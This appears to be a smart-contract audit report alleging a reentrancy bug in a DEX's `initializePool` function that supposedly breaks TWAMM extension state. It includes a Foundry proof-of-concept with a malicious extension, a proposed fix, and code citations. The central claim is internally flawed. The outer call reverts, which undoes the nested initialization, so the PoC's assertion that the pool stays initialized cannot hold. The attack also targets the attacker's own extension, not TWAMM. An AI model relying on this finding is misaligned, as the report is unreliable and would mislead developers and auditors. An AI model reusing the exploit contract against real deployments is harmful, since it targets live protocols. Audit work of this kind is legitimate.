## Title
Reentrancy in `initializePool` via Extension Callback Causes Permanent State Inconsistency for Extensions with `afterInitializePool` Hooks

## Summary
The `initializePool` function calls the extension's `beforeInitializePool` callback before checking if the pool is already initialized. A malicious or buggy extension can exploit this by calling `lock()` and recursively reinitializing the same pool, causing the Core pool to be initialized while bypassing the `afterInitializePool` callback, permanently breaking extensions like TWAMM that rely on this hook for state initialization. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` - `initializePool` function (lines 72-101)

**Intended Logic:** The `initializePool` function should initialize a pool exactly once, calling both `beforeInitializePool` (L83) and `afterInitializePool` (L100) extension callbacks in sequence, with the initialization check at L88 preventing double initialization.

**Actual Logic:** The extension callback at L83 is executed BEFORE the `state.isInitialized()` check at L88. If the extension calls `lock()` during `beforeInitializePool` and recursively calls `initializePool`, the recursive call will initialize the pool in Core storage (L91), but the `afterInitializePool` callback is never executed for the original call. This is because when control returns to the original call, the check at L88 detects the pool is already initialized and reverts with `PoolAlreadyInitialized()`. [2](#0-1) 

**Exploitation Path:**
1. Attacker deploys a malicious extension that implements `beforeInitializePool` to call `CORE.lock()` with a callback that reinitializes the same pool
2. User calls `initializePool(poolKey, tick)` where `poolKey.config.extension()` points to the malicious extension
3. At L83, Core calls the extension's `beforeInitializePool`, which calls `lock()` and recursively calls `initializePool(poolKey, tick)`
4. The recursive call initializes the pool at L91, but skips extension callbacks because `msg.sender == extension` (check in `shouldCallBeforeInitializePool` returns false) [3](#0-2) 

5. Control returns to the original call, which reaches L88 and reverts because the pool is now initialized
6. **Result**: Core pool state is initialized, but TWAMM's `afterInitializePool` was never called, leaving TWAMM state uninitialized [4](#0-3) 

**Security Property Broken:** 
- **Extension Isolation**: Extension failures should not freeze pools or lock user capital. In this case, a malicious extension can permanently break TWAMM functionality for a pool.
- **State Consistency**: All extension hooks must execute when a pool is initialized to maintain consistent state across Core and extensions.

## Impact Explanation
- **Affected Assets**: Any pool using TWAMM extension becomes permanently broken for TWAMM functionality. The TWAMM pool state (including `lastVirtualOrderExecutionTime`, `saleRateToken0`, `saleRateToken1`) remains uninitialized (zero values).
- **Damage Severity**: Complete loss of TWAMM functionality for the affected pool. Users cannot place DCA orders, execute virtual orders, or use any TWAMM features on this pool. The pool is usable for normal swaps but TWAMM operations will fail or behave incorrectly.
- **User Impact**: All users attempting to use TWAMM on the affected pool. The pool cannot be reinitialized (the Core check at L88 prevents it), so the damage is permanent unless the pool is abandoned and a new one is created.

## Likelihood Explanation
- **Attacker Profile**: Any actor who can deploy and register an extension contract. Extension registration is permissionless - any contract can self-register if its address encodes valid call points. [5](#0-4) 

- **Preconditions**: 
  1. Extension must be registered with Core
  2. Extension must have `beforeInitializePool` call point enabled
  3. User must attempt to initialize a pool with this extension
- **Execution Complexity**: Single transaction. The attacker deploys a malicious extension, registers it, and waits for a user to initialize a pool using it. Alternatively, the attacker can initialize the pool themselves to grief the protocol.
- **Frequency**: Once per pool. After exploitation, the pool is permanently in an inconsistent state.

## Recommendation

Move the `isInitialized()` check BEFORE the `beforeInitializePool` callback to prevent reentrancy:

```solidity
// In src/Core.sol, function initializePool, lines 72-101:

// FIXED:
function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
    poolKey.validate();

    // CHECK: Verify pool is not already initialized FIRST
    PoolId poolId = poolKey.toPoolId();
    PoolState state = readPoolState(poolId);
    if (state.isInitialized()) revert PoolAlreadyInitialized();

    address extension = poolKey.config.extension();
    if (extension != address(0)) {
        StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

        if (isExtensionRegisteredSlot.load() == bytes32(0)) {
            revert ExtensionNotRegistered();
        }

        IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
    }

    // EFFECT: Initialize pool state
    sqrtRatio = tickToSqrtRatio(tick);
    writePoolState(poolId, createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: 0}));

    // initialize these slots so the first swap or deposit on the pool is the same cost as any other swap
    StorageSlot fplSlot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
    fplSlot0.store(bytes32(uint256(1)));
    fplSlot0.next().store(bytes32(uint256(1)));

    emit PoolInitialized(poolId, poolKey, tick, sqrtRatio);

    IExtension(extension).maybeCallAfterInitializePool(msg.sender, poolKey, tick, sqrtRatio);
}
```

Alternative mitigation: Add a reentrancy guard using transient storage to prevent recursive `initializePool` calls during extension callbacks.

## Proof of Concept

```solidity
// File: test/Exploit_ReentrantInitialization.t.sol
// Run with: forge test --match-test test_ReentrantInitialization -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/interfaces/ICore.sol";
import "../src/base/BaseExtension.sol";
import "../src/types/poolKey.sol";
import "../src/types/poolConfig.sol";
import "../src/types/callPoints.sol";
import "../src/extensions/TWAMM.sol";

contract MaliciousExtension is BaseExtension {
    PoolKey public targetPoolKey;
    int32 public targetTick;
    bool public attacked;
    
    constructor(ICore core) BaseExtension(core) {}
    
    function getCallPoints() internal pure override returns (CallPoints memory) {
        return CallPoints({
            beforeInitializePool: true,
            afterInitializePool: false,
            beforeUpdatePosition: false,
            afterUpdatePosition: false,
            beforeSwap: false,
            afterSwap: false,
            beforeCollectFees: false,
            afterCollectFees: false
        });
    }
    
    function setTarget(PoolKey memory key, int32 tick) external {
        targetPoolKey = key;
        targetTick = tick;
    }
    
    function beforeInitializePool(address, PoolKey calldata key, int32 tick) 
        external override onlyCore 
    {
        if (!attacked && key.token0 == targetPoolKey.token0) {
            attacked = true;
            // Reentrancy: call lock and reinitialize the same pool
            CORE.lock();
        }
    }
    
    function locked_6416899205(uint256) external {
        // Recursively initialize the same pool
        CORE.initializePool(targetPoolKey, targetTick);
    }
}

contract Exploit_ReentrantInitialization is Test {
    Core core;
    MaliciousExtension maliciousExt;
    address token0 = address(0x1);
    address token1 = address(0x2);
    int32 tick = 0;
    
    function setUp() public {
        core = new Core();
        maliciousExt = new MaliciousExtension(ICore(address(core)));
    }
    
    function test_ReentrantInitialization() public {
        // Create pool key with malicious extension
        PoolKey memory key = PoolKey({
            token0: token0,
            token1: token1,
            config: createConcentratedPoolConfig(100, 1, address(maliciousExt))
        });
        
        maliciousExt.setTarget(key, tick);
        
        // Attempt to initialize - this will trigger reentrancy
        vm.expectRevert(ICore.PoolAlreadyInitialized.selector);
        core.initializePool(key, tick);
        
        // VERIFY: Pool IS initialized in Core
        PoolId poolId = key.toPoolId();
        PoolState state = core.getPoolState(poolId);
        assertTrue(state.isInitialized(), "Pool should be initialized");
        
        // VERIFY: But if this was a TWAMM pool, its state would be uninitialized
        // because afterInitializePool was never called
    }
}
```

## Notes

The vulnerability exploits the order of operations in `initializePool`. The critical issue is that extension callbacks are executed BEFORE the initialization check, allowing reentrancy. The `shouldCallBeforeInitializePool` function prevents infinite recursion by checking if `msg.sender == extension`, but this doesn't prevent the state inconsistency - it actually makes it worse because the recursive call bypasses all extension callbacks. [6](#0-5) 

For extensions like TWAMM that rely on `afterInitializePool` to set up critical state, this creates a permanent DoS condition where the pool is unusable for TWAMM operations. The fix is simple: perform the initialization check before calling any extension callbacks, following the checks-effects-interactions pattern.

### Citations

**File:** src/Core.sol (L50-61)
```text
    function registerExtension(CallPoints memory expectedCallPoints) external {
        CallPoints memory computed = addressToCallPoints(msg.sender);
        if (!computed.eq(expectedCallPoints) || !computed.isValid()) {
            revert FailedRegisterInvalidCallPoints();
        }
        StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(msg.sender);
        if (isExtensionRegisteredSlot.load() != bytes32(0)) revert ExtensionAlreadyRegistered();

        isExtensionRegisteredSlot.store(bytes32(LibBit.rawToUint(true)));

        emit ExtensionRegistered(msg.sender);
    }
```

**File:** src/Core.sol (L72-101)
```text
    function initializePool(PoolKey memory poolKey, int32 tick) external returns (SqrtRatio sqrtRatio) {
        poolKey.validate();

        address extension = poolKey.config.extension();
        if (extension != address(0)) {
            StorageSlot isExtensionRegisteredSlot = CoreStorageLayout.isExtensionRegisteredSlot(extension);

            if (isExtensionRegisteredSlot.load() == bytes32(0)) {
                revert ExtensionNotRegistered();
            }

            IExtension(extension).maybeCallBeforeInitializePool(msg.sender, poolKey, tick);
        }

        PoolId poolId = poolKey.toPoolId();
        PoolState state = readPoolState(poolId);
        if (state.isInitialized()) revert PoolAlreadyInitialized();

        sqrtRatio = tickToSqrtRatio(tick);
        writePoolState(poolId, createPoolState({_sqrtRatio: sqrtRatio, _tick: tick, _liquidity: 0}));

        // initialize these slots so the first swap or deposit on the pool is the same cost as any other swap
        StorageSlot fplSlot0 = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
        fplSlot0.store(bytes32(uint256(1)));
        fplSlot0.next().store(bytes32(uint256(1)));

        emit PoolInitialized(poolId, poolKey, tick, sqrtRatio);

        IExtension(extension).maybeCallAfterInitializePool(msg.sender, poolKey, tick, sqrtRatio);
    }
```

**File:** src/libraries/ExtensionCallPointsLib.sol (L15-23)
```text
    function shouldCallBeforeInitializePool(IExtension extension, address initializer)
        internal
        pure
        returns (bool yes)
    {
        assembly ("memory-safe") {
            yes := and(shr(152, extension), iszero(eq(initializer, extension)))
        }
    }
```

**File:** src/libraries/ExtensionCallPointsLib.sol (L49-53)
```text
    function shouldCallAfterInitializePool(IExtension extension, address initializer) internal pure returns (bool yes) {
        assembly ("memory-safe") {
            yes := and(shr(159, extension), iszero(eq(initializer, extension)))
        }
    }
```

**File:** src/extensions/TWAMM.sol (L624-644)
```text
    // This method must be protected because it sets state directly
    function afterInitializePool(address, PoolKey memory key, int32, SqrtRatio)
        external
        override(BaseExtension, IExtension)
        onlyCore
    {
        if (!key.config.isFullRange()) revert FullRangePoolOnly();

        PoolId poolId = key.toPoolId();

        TWAMMStorageLayout.twammPoolStateSlot(poolId)
            .store(
                TwammPoolState.unwrap(
                    createTwammPoolState({
                        _lastVirtualOrderExecutionTime: uint32(block.timestamp), _saleRateToken0: 0, _saleRateToken1: 0
                    })
                )
            );

        _emitVirtualOrdersExecuted({poolId: poolId, saleRateToken0: 0, saleRateToken1: 0});
    }
```
